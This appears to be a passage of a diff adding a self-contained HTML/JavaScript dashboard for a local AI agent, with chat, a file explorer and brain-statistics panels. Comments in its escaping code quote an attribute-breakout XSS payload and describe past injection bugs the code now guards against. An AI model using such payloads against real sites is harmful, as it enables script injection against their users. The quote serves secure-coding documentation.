+button:focus-visible, input:focus-visible, select:focus-visible, textarea:focus-visible {
+  outline: 2px solid var(--accent);
+  outline-offset: 2px;
+}
+</style>
+</head>
+<body>
+
+<!-- ── Mobile Overlay ── -->
+<div id="mob-overlay"></div>
+
+<!-- ── App ── -->
+<div id="app">
+
+  <!-- ═══════════ SIDEBAR ═══════════ -->
+  <aside id="sidebar" role="navigation" aria-label="Conversation history">
+    <div id="sb-logo">
+      <div class="logo-name">SENTINEL</div>
+      <div class="logo-sub">Command Center v9</div>
+    </div>
+
+    <nav id="sb-nav">
+      <button class="nb on" data-page="chat" onclick="goPage('chat', this)" aria-label="Chat page">
+        <span class="ic">💬</span><span>Chat</span>
+      </button>
+      <button class="nb" data-page="brain" onclick="goPage('brain', this)" aria-label="Brain Lab page">
+        <span class="ic">🧠</span><span>Brain Lab</span>
+      </button>
+    </nav>
+
+    <div id="sb-search" style="display:flex;gap:4px;align-items:center">
+      <input type="text" id="conv-search" placeholder="Search conversations..." aria-label="Search conversations" oninput="filterConvs(this.value)" style="flex:1">
+      <button class="nc-btn" onclick="newConv()" title="New chat" aria-label="New chat" style="flex-shrink:0">＋</button>
+    </div>
+
+    <div id="sb-convs" role="listbox" aria-label="Conversation list">
+      <!-- Phase 3: Populated by JS -->
+      <div class="conv-group" data-group="today">
+        <div class="conv-group-hdr" onclick="toggleGroup(this)" tabindex="0" role="button" aria-expanded="true">
+          <span class="conv-group-label">Today</span>
+          <span class="conv-group-count">0</span>
+          <span class="conv-group-chevron">▼</span>
+        </div>
+        <div class="conv-group-body"></div>
+      </div>
+      <div class="conv-group" data-group="yesterday">
+        <div class="conv-group-hdr" onclick="toggleGroup(this)" tabindex="0" role="button" aria-expanded="true">
+          <span class="conv-group-label">Yesterday</span>
+          <span class="conv-group-count">0</span>
+          <span class="conv-group-chevron">▼</span>
+        </div>
+        <div class="conv-group-body"></div>
+      </div>
+      <div class="conv-group collapsed" data-group="last-week">
+        <div class="conv-group-hdr" onclick="toggleGroup(this)" tabindex="0" role="button" aria-expanded="false">
+          <span class="conv-group-label">Last Week</span>
+          <span class="conv-group-count">0</span>
+          <span class="conv-group-chevron">▼</span>
+        </div>
+        <div class="conv-group-body"></div>
+      </div>
+      <div class="conv-group collapsed" data-group="older">
+        <div class="conv-group-hdr" onclick="toggleGroup(this)" tabindex="0" role="button" aria-expanded="false">
+          <span class="conv-group-label">Older</span>
+          <span class="conv-group-count">0</span>
+          <span class="conv-group-chevron">▼</span>
+        </div>
+        <div class="conv-group-body"></div>
+      </div>
+    </div>
+
+    <div id="sb-footer">
+      <select id="model-sel" aria-label="Model selector">
+        <option value="">Loading models…</option>
+      </select>
+      <div class="tog-row">
+        <span>Auto-route</span>
+        <input type="checkbox" id="ar-tog" aria-label="Toggle auto-route">
+      </div>
+    </div>
+  </aside>
+
+  <!-- ═══════════ MAIN ═══════════ -->
+  <main id="main">
+
+    <!-- Top Bar -->
+    <header id="top" role="banner">
+      <div id="top-left">
+        <button id="hbg" onclick="toggleSidebar()" aria-label="Toggle sidebar">☰</button>
+        <div id="sdot" title="Status: Connected"></div>
+        <span id="top-ctx">Chat</span>
+      </div>
+      <div id="top-actions">
+        <button class="top-btn" onclick="toggleRight()" title="Toggle file explorer (Ctrl+.)">
+          <span class="ic">📁</span><span class="btn-label">Files</span>
+        </button>
+        <button class="top-btn primary" id="run-btn" onclick="sendMsg()" title="Run (Ctrl+Enter)">
+          <span class="ic">▶</span><span class="btn-label">Run</span>
+        </button>
+        <button class="top-btn danger" id="stop-btn" onclick="stopStream()" style="display:none" title="Stop (Esc)">
+          <span class="ic">⬛</span><span class="btn-label">Stop</span>
+        </button>
+        <div id="top-overflow">
+          <button class="top-btn" onclick="toggleOverflow()" aria-label="More actions">⋯</button>
+          <div id="top-overflow-menu">
+            <div class="overflow-item" onclick="openCmdPalette()"><span>⌘</span> Command Palette <span class="cmd-item-key">Ctrl+K</span></div>
+            <div class="overflow-item" onclick="toggleTheme()"><span>🎨</span> Switch Theme</div>
+            <div class="overflow-item" onclick="exportLog()"><span>📋</span> Export Log</div>
+            <div class="overflow-item" onclick="takeScreenshot()"><span>📸</span> Screenshot</div>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <!-- Content -->
+    <div id="content">
+
+      <!-- Chat Page -->
+      <div class="pg on" id="pg-chat">
+        <div id="chat-area">
+          <div id="msgs" role="log" aria-live="polite">
+            <div class="msg s"><div class="mb">Sentinel Command Center v9 — Ready. Describe a goal and press Enter.</div></div>
+          </div>
+          <div id="inp-area">
+            <div class="inp-row">
+              <textarea id="msginp" placeholder="Describe what you want done… (Ctrl+Enter to run)" rows="1" aria-label="Message input"></textarea>
+              <div class="ia">
+                <button class="ab" onclick="document.getElementById('fup').click()" title="Attach file" aria-label="Attach file">📎</button>
+                <button class="sb" id="sbtn" onclick="sendMsg()" title="Send (Ctrl+Enter)" aria-label="Send message">▶</button>
+              </div>
+            </div>
+            <input type="file" id="fup" multiple style="display:none" onchange="onFileInput(this)" aria-hidden="true">
+          </div>
+        </div>
+      </div>
+
+      <!-- Brain Lab Page -->
+      <div class="pg" id="pg-brain" style="padding:16px;overflow-y:auto">
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;flex-shrink:0">
+          <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--r);padding:14px;text-align:center">
+            <div style="font-size:1.5rem;margin-bottom:4px">⚡</div>
+            <div style="font-size:1.4rem;font-weight:700;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="sv-n">—</div>
+            <div style="font-size:.68rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:2px">Neurons</div>
+          </div>
+          <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--r);padding:14px;text-align:center">
+            <div style="font-size:1.5rem;margin-bottom:4px">🔗</div>
+            <div style="font-size:1.4rem;font-weight:700;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="sv-s">—</div>
+            <div style="font-size:.68rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:2px">Synapses</div>
+          </div>
+          <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--r);padding:14px;text-align:center">
+            <div style="font-size:1.5rem;margin-bottom:4px">🗺️</div>
+            <div style="font-size:1.4rem;font-weight:700;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="sv-r">—</div>
+            <div style="font-size:.68rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:2px">Regions</div>
+          </div>
+          <div style="background:var(--surface);border:1px solid var(--border);border-radius:var(--r);padding:14px;text-align:center">
+            <div style="font-size:1.5rem;margin-bottom:4px">🔖</div>
+            <div style="font-size:1.4rem;font-weight:700;background:var(--grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="sv-v">—</div>
+            <div style="font-size:.68rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-top:2px">Version</div>
+          </div>
+        </div>
+
+        <!-- ── Neuralis brain panel (v9) ──
+             Fed by the brain API on :8001. Never :8000 — that port only answers
+             through an undocumented netsh portproxy and is not a real listener.
+             Every field below is one that /health, /brain/stats or
+             /brain/diagnostics was verified to actually return. -->
+        <div style="margin-top:14px;background:var(--surface);border:1px solid var(--border);border-radius:var(--r);padding:14px">
+          <div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">
+            <span style="font-size:1.1rem">🧠</span>
+            <span style="font-size:.8rem;font-weight:700;letter-spacing:.5px">NEURALIS BRAIN</span>
+            <span id="brain-badge" style="margin-left:auto;font-size:.64rem;text-transform:uppercase;letter-spacing:1px;padding:2px 8px;border-radius:99px;border:1px solid var(--border);color:var(--muted)">checking…</span>
+          </div>
+          <div id="brain-endpoint" style="font-size:.66rem;color:var(--muted);margin-bottom:10px">http://localhost:8001</div>
+          <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px">
+            <div><div class="bl-k">Status</div><div class="bl-v" id="bl-status">—</div></div>
+            <div><div class="bl-k">Active pack</div><div class="bl-v" id="bl-pack">—</div></div>
+            <div><div class="bl-k">Storage</div><div class="bl-v" id="bl-storage">—</div></div>
+            <div><div class="bl-k">Uptime</div><div class="bl-v" id="bl-uptime">—</div></div>
+            <div><div class="bl-k">DB size</div><div class="bl-v" id="bl-db">—</div></div>
+            <div><div class="bl-k">WAL</div><div class="bl-v" id="bl-wal">—</div></div>
+            <div><div class="bl-k">Embedding model</div><div class="bl-v" id="bl-embmodel">—</div></div>
+            <div><div class="bl-k">Vectors</div><div class="bl-v" id="bl-vectors">—</div></div>
+            <div><div class="bl-k">Lock retries / drops</div><div class="bl-v" id="bl-locks">—</div></div>
+            <div><div class="bl-k">Top region</div><div class="bl-v" id="bl-topregion">—</div></div>
+          </div>
+          <button class="top-btn" id="brain-refresh" style="margin-top:12px">↻ Refresh brain</button>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Mobile Bottom Tabs -->
+    <div id="btabs">
+      <div class="tbr">
+        <button class="tbb on" onclick="goPage('chat',null);mobTabActive(this)"><span class="ti">💬</span><span>Chat</span></button>
+        <button class="tbb" onclick="toggleRight();mobTabActive(this)"><span class="ti">📁</span><span>Files</span></button>
+        <button class="tbb" onclick="goPage('brain',null);mobTabActive(this)"><span class="ti">🧠</span><span>Brain</span></button>
+        <button class="tbb" onclick="openCmdPalette();mobTabActive(this)"><span class="ti">⌘</span><span>Commands</span></button>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- ═══════════ FILE EXPLORER ═══════════ -->
+  <aside id="file-explorer" role="complementary" aria-label="File explorer">
+    <div id="fe-header">
+      <div id="fe-title">📁 File Explorer</div>
+      <div id="fe-breadcrumb">
+        <!-- Handler attached in setupStaticHandlers(); an inline onclick here
+             would double-fire alongside it. -->
+        <span class="bc-item">C:</span>
+      </div>
+    </div>
+    <div id="fe-tree" role="tree" aria-label="Directory tree">
+      <!-- Phase 4: Populated by JS -->
+      <div class="fe-entry" style="color:var(--muted);font-style:italic">
+        <span class="fe-entry-icon">⏳</span>
+        <span class="fe-entry-name">Loading…</span>
+      </div>
+    </div>
+  </aside>
+
+</div>
+
+<!-- ── File Viewer Modal ── -->
+<div id="file-viewer" role="dialog" aria-modal="true" aria-label="File viewer">
+  <div id="fv-content">
+    <div id="fv-header">
+      <span id="fv-title">File Viewer</span>
+      <button id="fv-close" onclick="closeFileViewer()" aria-label="Close file viewer">✕</button>
+    </div>
+    <div id="fv-body"></div>
+  </div>
+</div>
+
+<!-- ── Command Palette ── -->
+<div id="cmd-palette" role="dialog" aria-modal="true" aria-label="Command palette">
+  <div id="cmd-box">
+    <input type="text" id="cmd-input" placeholder="Type a command…" aria-label="Command search" autocomplete="off">
+    <div id="cmd-results"></div>
+  </div>
+</div>
+
+<!-- ── Toast Container ── -->
+<div id="toast-container" aria-live="polite" aria-atomic="true"></div>
+
+<script>
+'use strict';
+
+// ═══════════ STATE ═══════════
+const API = 'http://localhost:8091';
+// Neuralis brain API. Must be 8001: port 8000 only ever answered via an
+// undocumented `netsh interface portproxy` rule, so it is not a dependable
+// endpoint and must never be hardcoded here.
+const BRAIN_API = 'http://localhost:8001';
+let abort = null;
+let streaming = false;
+let convId = null;
+let allModels = [];
+let currentPath = 'C:\\';
+let sidebarCollapsed = false;
+let rightCollapsed = false;
+
+// Cap on rendered chat messages. Both appendMsg() and the WebSocket handler
+// funnel through appendMsg, and neither used to bound #msgs, so a long-running
+// or chatty agent session grew the DOM until the tab crawled.
+const MAX_MESSAGES = 300;
+
+// ═══════════ ESCAPING (mirrored from web/lib/dash-escape.js) ═══════════
+// This dashboard has to stay a single self-contained file that works from
+// file://, so it cannot `import` the shared module. The block below is a
+// verbatim mirror of the marked region in web/lib/dash-escape.js;
+// tests/web-dash-escape.test.js fails the build if the two copies drift.
+
+// ─── BEGIN dash-escape shared block ───
+
+// Escape a value for interpolation into HTML text OR into a QUOTED HTML
+// attribute value (single- or double-quoted).
+//
+// The pre-v9 helper was `d.textContent = str; return d.innerHTML`, which the
+// HTML spec only requires to escape `&`, `<` and `>`. That is safe for text
+// nodes and unsafe for attributes: `x" onerror=alert(1) y="` survived it
+// untouched and broke straight out of `<img alt="...">`.
+//
+// INVARIANT: callers must always place the result inside quotes. This helper
+// does not escape `=` or whitespace, so an UNQUOTED attribute is still
+// exploitable. Never write `<div data-x=${escHtml(v)}>`.
+//
+// This is NOT sufficient for a JavaScript code context. Do not interpolate the
+// result into `onclick="fn('...')"` — attach listeners with addEventListener
+// and close over the raw value instead, so untrusted text never becomes code.
+function escHtml(value) {
+  if (value === null || value === undefined) return '';
+  return String(value)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#39;')
+    .replace(/`/g, '&#96;');
+}
+
+// Alias that documents intent at attribute call sites. Same implementation:
+// the six-character escape set is simultaneously correct for text and for
+// quoted attributes, and one shared code path means one thing to audit.
+const escAttr = escHtml;
+
+// Only base64 raster images. `image/svg+xml` is deliberately absent: an SVG can
+// carry <script> and event handlers, so a "valid" SVG data URI is still an XSS
+// vector when handed to <img> in some contexts and to navigation in others.
+// The non-base64 `data:image/png,<payload>` form is also rejected, because its
+// payload is unencoded and can contain quotes.
+const SAFE_IMAGE_DATA_URI_RE =
+  /^data:image\/(?:png|jpeg|jpg|gif|webp|bmp|avif|x-icon);base64,[A-Za-z0-9+/=\s]+$/i;
+
+// 8 MiB of base64 — comfortably above any real screenshot, low enough that a
+// hostile response cannot wedge the renderer.
+const MAX_IMAGE_DATA_URI_LENGTH = 8 * 1024 * 1024;
+
+function isSafeImageDataUri(value) {
+  if (typeof value !== 'string') return false;
+  if (value.length === 0 || value.length > MAX_IMAGE_DATA_URI_LENGTH) return false;
+  return SAFE_IMAGE_DATA_URI_RE.test(value);
+}
+
+// ─── END dash-escape shared block ───
+
+// ═══════════ RESILIENT DATA LAYER ═══════════
+// Every request goes through here so that no call site can forget a timeout or
+// an res.ok check. Failures are classified, because "unreachable" and
+// "reachable but unhealthy" need different words in the UI:
+//   'offline'  — never got a response (DNS, refused, timeout, abort)
+//   'degraded' — HTTP 503; fleet convention is an unhealthy service answers
+//                503 with a JSON body describing itself
+//   'error'    — any other non-2xx, or a body that is not the JSON we expect
+const DEFAULT_TIMEOUT_MS = 8000;
+
+function apiError(kind, status, message) {
+  const err = new Error(message);
+  err.name = 'ApiError';
+  err.kind = kind;
+  err.status = status;
+  return err;
+}
+
+async function apiFetch(url, opts) {
+  const o = opts || {};
+  const timeoutMs = o.timeoutMs || DEFAULT_TIMEOUT_MS;
+  const init = Object.assign({}, o);
+  delete init.timeoutMs;
+
+  // Always arm a timeout. If the caller also passed its own signal (the Stop
+  // button), honour both.
+  const timeoutSignal = AbortSignal.timeout(timeoutMs);
+  init.signal = o.signal && AbortSignal.any
+    ? AbortSignal.any([o.signal, timeoutSignal])
+    : (o.signal || timeoutSignal);
+
+  let res;
+  try {
+    res = await fetch(url, init);
+  } catch (exc) {
+    if (o.signal && o.signal.aborted) throw exc;   // user pressed Stop
+    throw apiError('offline', 0, exc && exc.message ? exc.message : 'Network error');
+  }
+
+  if (res.status === 503) {
+    let detail = 'service unhealthy';
+    try {
+      const body = await res.json();
+      detail = body.detail || body.status || body.error || detail;
+    } catch { /* 503 without a JSON body */ }
+    throw apiError('degraded', 503, String(detail));
+  }
+
+  if (!res.ok) {
+    throw apiError('error', res.status, 'HTTP ' + res.status);
+  }
+  return res;
+}
+
+async function apiJson(url, opts) {
+  const res = await apiFetch(url, opts);
+  try {
+    return await res.json();
+  } catch {
+    throw apiError('error', res.status, 'Malformed JSON response');
+  }
+}
+
+// Short human label for a caught error, for use in degraded-state UI.
+function errLabel(exc) {
+  if (!exc) return 'unknown error';
+  if (exc.kind === 'offline') return 'unreachable';
+  if (exc.kind === 'degraded') return 'degraded';
+  if (exc.kind === 'error') return exc.message || 'error';
+  return exc.message || 'error';
+}
+
+function formatBytes(bytes) {
+  if (typeof bytes !== 'number' || !isFinite(bytes)) return '—';
+  if (bytes < 1024) return bytes + ' B';
+  if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+  if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
+  return (bytes / 1073741824).toFixed(2) + ' GB';
+}
+
+function formatDuration(seconds) {
+  if (typeof seconds !== 'number' || !isFinite(seconds)) return '—';
+  const s = Math.floor(seconds);
+  if (s < 60) return s + 's';
+  if (s < 3600) return Math.floor(s / 60) + 'm ' + (s % 60) + 's';
+  if (s < 86400) return Math.floor(s / 3600) + 'h ' + Math.floor((s % 3600) / 60) + 'm';
+  return Math.floor(s / 86400) + 'd ' + Math.floor((s % 86400) / 3600) + 'h';
+}
+
+// ═══════════ WEBSOCKET ═══════════
+let ws = null;
+let wsRetryDelay = 1000;
+
+function connectWS() {
+  try {
+    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    ws = new WebSocket(`${proto}//${location.host}/ws`);
+    ws.onopen = () => { wsRetryDelay = 1000; };
+    ws.onmessage = (e) => {
+      try {
+        const msg = JSON.parse(e.data);
+        if (msg.type === 'message' && msg.message) {
+          const m = msg.message;
+          if (m.role === 'assistant') appendMsg('a', m.content);
+        } else if (msg.type === 'done') {
+          streaming = false;
+          setDot('ok');
+          document.getElementById('stop-btn').style.display = 'none';
+          document.getElementById('run-btn').style.display = '';
+        }
+      } catch {}
+    };
+    ws.onclose = () => {
+      setTimeout(connectWS, wsRetryDelay);
+      wsRetryDelay = Math.min(wsRetryDelay * 2, 30000);
+    };
+    ws.onerror = () => { ws.close(); };
+  } catch {
+    setTimeout(connectWS, wsRetryDelay);
+  }
+}
+
+// ═══════════ INIT ═══════════
+(async function init() {
+  setupInput();
+  setupKeyboard();
+  setupStaticHandlers();
+  loadGroupState();
+  // allSettled, not all: one dead subsystem must not abort the others.
+  await Promise.allSettled([loadModels(), loadConvs(), loadBrainStats(), loadFiles(currentPath)]);
+  ping();
+  connectWS();
+})();
+
+// Wire up the handlers for statically-rendered controls. Kept out of inline
+// onclick= attributes so the page stays compatible with a strict CSP.
+function setupStaticHandlers() {
+  const refreshBtn = document.getElementById('brain-refresh');
+  if (refreshBtn) refreshBtn.addEventListener('click', () => loadBrainStats());
+  document.querySelectorAll('#fe-breadcrumb .bc-item').forEach(el => {
+    el.addEventListener('click', () => navigateTo('C:\\'));
+  });
+}
+
+// ═══════════ CONNECTIVITY ═══════════
+async function ping() {
+  try {
+    await apiFetch(API + '/status', { timeoutMs: 4000 });
+    setDot('ok', 'Desktop API reachable');
+  } catch (exc) {
+    // Distinguish "answered 503, so it is up but sick" from "no answer at all".
+    if (exc.kind === 'degraded') {
+      setDot('warn', 'Desktop API degraded: ' + exc.message);
+    } else {
+      setDot('err', 'Desktop API ' + errLabel(exc));
+    }
+    setTimeout(ping, 6000);
+    return;
+  }
+  setTimeout(ping, 30000);
+}
+
+function setDot(s, detail) {
+  const d = document.getElementById('sdot');
+  d.className = s === 'err' ? 'err' : s === 'warn' ? 'warn' : s === 'act' ? 'act' : '';
+  const labels = { err: 'Offline', warn: 'Degraded', act: 'Working', ok: 'Connected' };
+  d.title = 'Status: ' + (labels[s] || 'Connected') + (detail ? ' — ' + detail : '');
+}
+
+// ═══════════ PANEL TOGGLES ═══════════
+function toggleSidebar() {
+  sidebarCollapsed = !sidebarCollapsed;
+  const app = document.getElementById('app');
+  if (window.innerWidth <= 767) {
+    document.getElementById('sidebar').classList.toggle('mob-open');
+    document.getElementById('mob-overlay').classList.toggle('open');
+  } else {
+    app.classList.toggle('sidebar-collapsed', sidebarCollapsed);
+    app.classList.toggle('both-collapsed', sidebarCollapsed && rightCollapsed);
+  }
+}
+
+function toggleRight() {
+  rightCollapsed = !rightCollapsed;
+  const app = document.getElementById('app');
+  if (window.innerWidth <= 767) {
+    document.getElementById('file-explorer').classList.toggle('mob-open');
+    document.getElementById('mob-overlay').classList.toggle('open');
+  } else {
+    app.classList.toggle('right-collapsed', rightCollapsed);
+    app.classList.toggle('both-collapsed', sidebarCollapsed && rightCollapsed);
+  }
+}
+
+// ═══════════ TOP BAR OVERFLOW ═══════════
+function toggleOverflow() {
+  const menu = document.getElementById('top-overflow-menu');
+  menu.classList.toggle('open');
+  if (menu.classList.contains('open')) {
+    document.addEventListener('click', closeOverflow, { once: true });
+  }
+}
+
+function closeOverflow(e) {
+  const menu = document.getElementById('top-overflow-menu');
+  const btn = document.getElementById('top-overflow');
+  if (!btn.contains(e.target)) {
+    menu.classList.remove('open');
+  }
+}
+
+// ═══════════ PAGE NAVIGATION ═══════════
+function goPage(page, btn) {
+  document.querySelectorAll('.pg').forEach(p => p.classList.remove('on'));
+  document.getElementById('pg-' + page).classList.add('on');
+  document.querySelectorAll('.nb').forEach(b => b.classList.remove('on'));
+  if (btn) btn.classList.add('on');
+  document.getElementById('top-ctx').textContent = page === 'chat' ? 'Chat' : 'Brain Lab';
+  if (window.innerWidth <= 767) {
+    document.getElementById('sidebar').classList.remove('mob-open');
+    document.getElementById('mob-overlay').classList.remove('open');
+  }
+}
+
+function mobTabActive(el) {
+  document.querySelectorAll('.tbb').forEach(b => b.classList.remove('on'));
+  el.classList.add('on');
+}
+
+// ═══════════ CONVERSATION GROUPS ═══════════
+function toggleGroup(hdr) {
+  const group = hdr.parentElement;
+  group.classList.toggle('collapsed');
+  hdr.setAttribute('aria-expanded', !group.classList.contains('collapsed'));
+  saveGroupState();
+}
+
+function saveGroupState() {
+  const state = {};
+  document.querySelectorAll('.conv-group').forEach(g => {
+    state[g.dataset.group] = g.classList.contains('collapsed');
+  });
+  localStorage.setItem('dash8-groups', JSON.stringify(state));
+}
+
+function loadGroupState() {
+  try {
+    const state = JSON.parse(localStorage.getItem('dash8-groups') || '{}');
+    document.querySelectorAll('.conv-group').forEach(g => {
+      const collapsed = state[g.dataset.group];
+      if (collapsed === true) {
+        g.classList.add('collapsed');
+        g.querySelector('.conv-group-hdr').setAttribute('aria-expanded', 'false');
+      }
+    });
+  } catch {}
+}
+
+function filterConvs(query) {
+  const q = query.toLowerCase();
+  document.querySelectorAll('.conv-item').forEach(item => {
+    const title = item.querySelector('.conv-item-title')?.textContent?.toLowerCase() || '';
+    item.style.display = (!q || title.includes(q)) ? '' : 'none';
+  });
+}
+
+// ═══════════ MODELS ═══════════
+async function loadModels() {
+  const sel = document.getElementById('model-sel');
+  try {
+    const cfg = await apiJson(API + '/config');
+    // Built through the DOM rather than innerHTML: cfg.model is API-supplied and
+    // was interpolated raw into value="..." here, which is attribute-breakout
+    // territory the same way the file list was.
+    sel.textContent = '';
+    const opt = document.createElement('option');
+    opt.value = cfg.model || '';
+    opt.textContent = cfg.model || 'No model';
+    sel.appendChild(opt);
+    document.getElementById('ar-tog').checked = !!cfg.auto_route;
+  } catch (exc) {
+    sel.textContent = '';
+    const opt = document.createElement('option');
+    opt.value = '';
+    opt.textContent = exc.kind === 'degraded' ? 'Degraded' : 'Unavailable';
+    sel.appendChild(opt);
+    sel.title = 'Model list ' + errLabel(exc);
+  }
+}
+
+// ═══════════ CONVERSATIONS (Phase 3 placeholder) ═══════════
+async function loadConvs() {
+  // Phase 3: Will fetch from /api/conversations and group by date
+  // For now, show placeholder
+  renderConvs([]);
+}
+
+function renderConvs(convs) {
+  const now = new Date();
+  const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+  const yesterday = new Date(today); yesterday.setDate(yesterday.getDate() - 1);
+  const weekStart = new Date(today); weekStart.setDate(weekStart.getDate() - 7);
+
+  const groups = { today: [], yesterday: [], 'last-week': [], older: [] };
+
+  convs.forEach(c => {
+    const d = new Date(c.updated_at || c.created_at || 0);
+    if (d >= today) groups.today.push(c);
+    else if (d >= yesterday) groups.yesterday.push(c);
+    else if (d >= weekStart) groups['last-week'].push(c);
+    else groups.older.push(c);
+  });
+
+  document.querySelectorAll('.conv-group').forEach(g => {
+    const body = g.querySelector('.conv-group-body');
+    const count = g.querySelector('.conv-group-count');
+    const items = groups[g.dataset.group] || [];
+    count.textContent = items.length;
+    body.innerHTML = '';
+
+    if (items.length === 0) {
+      body.innerHTML = '<div style="padding:4px 8px;font-size:.72rem;color:var(--muted)">No conversations</div>';
+      return;
+    }
+
+    items.forEach(c => {
+      const div = document.createElement('div');
+      div.className = 'conv-item' + (c.id === convId ? ' on' : '');
+      div.setAttribute('role', 'option');
+      div.setAttribute('tabindex', '0');
+      // The delete button used to be `onclick="...delConv('${esc(c.id)}')"`.
+      // esc() left `'` alone, so an id containing an apostrophe closed the JS
+      // string literal and the rest of the id ran as code. Now the id never
+      // enters a code context at all — the listener closes over the raw value.
+      div.innerHTML = `
+        <div class="conv-item-body">
+          <div class="conv-item-title">${escHtml(c.title || 'Untitled')}</div>
+          <div class="conv-item-meta">${escHtml(timeAgo(c.updated_at || c.created_at))}${c.step_count ? ' · ' + escHtml(c.step_count) + ' steps' : ''}</div>
+        </div>
+        <button class="conv-item-del" aria-label="Delete conversation">✕</button>
+      `;
+      div.querySelector('.conv-item-del').addEventListener('click', e => {
+        e.stopPropagation();
+        delConv(c.id);
+      });
+      div.addEventListener('click', () => openConv(c.id, div));
+      div.addEventListener('keydown', e => { if (e.key === 'Enter') openConv(c.id, div); });
+      body.appendChild(div);
+    });
+  });
+}
+
+function timeAgo(dateStr) {
+  if (!dateStr) return 'Unknown';
+  const d = new Date(dateStr);
+  const now = new Date();
+  const diff = (now - d) / 1000;
+  if (diff < 60) return 'just now';
+  if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
+  if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
+  if (diff < 604800) return Math.floor(diff / 86400) + 'd ago';
+  return d.toLocaleDateString();
+}
+
+// `el` is passed explicitly. This used to read the non-standard implicit global
+// `event`, which is absent in strict/module contexts and in non-Chromium
+// browsers, so the active-row highlight silently did nothing there.
+async function openConv(id, el) {
+  convId = id;
+  document.querySelectorAll('.conv-item').forEach(i => i.classList.remove('on'));
+  if (el) el.classList.add('on');
+  // Phase 5: Load messages from API
+  appendMsg('s', 'Loading conversation…');
+}
+
+async function delConv(id) {
+  if (!confirm('Delete this conversation?')) return;
+  // Phase 5: API delete
+  toast('Conversation deleted', 'ok');
+  loadConvs();
+}
+
+// ═══════════ BRAIN STATS (v9: live from the Neuralis brain on :8001) ═══════════
+// v8 fetched /dashboard/overview from the Desktop API, ignored the parsed body
+// entirely, and hardcoded the version to 'v8.0'. Neurons / Synapses / Regions
+// were only ever written in the catch block, so on a *successful* request they
+// stayed at their placeholder em-dash. The panel has therefore never worked.
+//
+// Field names below were confirmed against the live API before being used:
+//   GET /health             -> status, version, storage, pack
+//   GET /brain/stats        -> version, active_pack, totals{neurons,synapses,regions},
+//                              neurons_per_region[{region,count}]
+//   GET /brain/diagnostics  -> uptime_seconds, db{path,size_bytes,wal_bytes},
+//                              embeddings{total_vectors,model}, write_contention{lock_retries,lock_drops}
+function setText(id, value) {
+  const el = document.getElementById(id);
+  if (el) el.textContent = value === null || value === undefined || value === '' ? '—' : String(value);
+}
+
+function setBrainBadge(state, text) {
+  const b = document.getElementById('brain-badge');
+  if (!b) return;
+  b.className = state;
+  b.textContent = text;
+}
+
+async function loadBrainStats() {
+  setBrainBadge('', 'checking…');
+
+  // /brain/stats carries the counters the four hero tiles need. It is a large
+  // response, so it is fetched on demand (init + the Refresh button) rather
+  // than on a poll.
+  let stats = null;
+  let statsErr = null;
+  try {
+    stats = await apiJson(BRAIN_API + '/brain/stats', { timeoutMs: 10000 });
+  } catch (exc) {
+    statsErr = exc;
+  }
+
+  if (stats && stats.totals) {
+    setText('sv-n', (stats.totals.neurons || 0).toLocaleString());
+    setText('sv-s', (stats.totals.synapses || 0).toLocaleString());
+    setText('sv-r', (stats.totals.regions || 0).toLocaleString());
+    setText('sv-v', stats.version ? 'v' + stats.version : '—');
+    setText('bl-pack', stats.active_pack);
+    const regions = Array.isArray(stats.neurons_per_region) ? stats.neurons_per_region : [];
+    const top = regions.length ? regions.reduce((a, b) => ((b.count || 0) > (a.count || 0) ? b : a)) : null;
+    setText('bl-topregion', top ? top.region + ' (' + (top.count || 0).toLocaleString() + ')' : '—');
+  } else {
+    // Degrade to a legible state instead of leaving stale numbers on screen.
+    ['sv-n', 'sv-s', 'sv-r', 'sv-v', 'bl-pack', 'bl-topregion'].forEach(id => setText(id, '—'));
+  }
+
+  let health = null;
+  let healthErr = null;
+  try {
+    health = await apiJson(BRAIN_API + '/health', { timeoutMs: 5000 });
+  } catch (exc) {
+    healthErr = exc;
+  }
+
+  if (health) {
+    setText('bl-status', health.status || 'unknown');
+    setText('bl-storage', health.storage);
+    if (!stats && health.version) setText('sv-v', 'v' + health.version);
+    if (!stats && health.pack) setText('bl-pack', health.pack);
+  } else {
+    setText('bl-status', errLabel(healthErr));
+    setText('bl-storage', '—');
+  }
+
+  try {
+    const diag = await apiJson(BRAIN_API + '/brain/diagnostics', { timeoutMs: 5000 });
+    setText('bl-uptime', formatDuration(diag.uptime_seconds));
+    setText('bl-db', diag.db ? formatBytes(diag.db.size_bytes) : '—');
+    setText('bl-wal', diag.db ? formatBytes(diag.db.wal_bytes) : '—');
+    setText('bl-embmodel', diag.embeddings ? diag.embeddings.model : '—');
+    setText('bl-vectors', diag.embeddings && typeof diag.embeddings.total_vectors === 'number'
+      ? diag.embeddings.total_vectors.toLocaleString() : '—');
+    setText('bl-locks', diag.write_contention
+      ? (diag.write_contention.lock_retries || 0) + ' / ' + (diag.write_contention.lock_drops || 0)
+      : '—');
+  } catch {
